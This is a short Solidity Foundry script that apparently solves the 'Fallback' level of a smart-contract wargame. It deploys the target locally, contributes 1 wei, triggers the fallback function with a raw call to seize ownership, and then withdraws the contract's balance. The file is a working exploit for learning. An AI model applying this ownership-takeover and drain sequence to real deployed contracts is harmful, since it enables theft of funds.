// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../src/level1.sol";

contract FallbackTest is Script {
    Fallback level1 = new Fallback();

    function run() public {
        vm.startBroadcast();

        uint256 old_balance = address(level1).balance;
        // console.log("Fallback address: ", address(level1));
        console.log("Fallback owner: ", level1.owner());

        // Exploitation
        level1.contribute{value: 1 wei}();
        address(level1).call{value: 1 wei, gas: 30000}("");
        level1.withdraw();
        console.log(address(vm));
        console.log("New fallback owner: ", level1.owner());

        vm.stopBroadcast();
    }
}
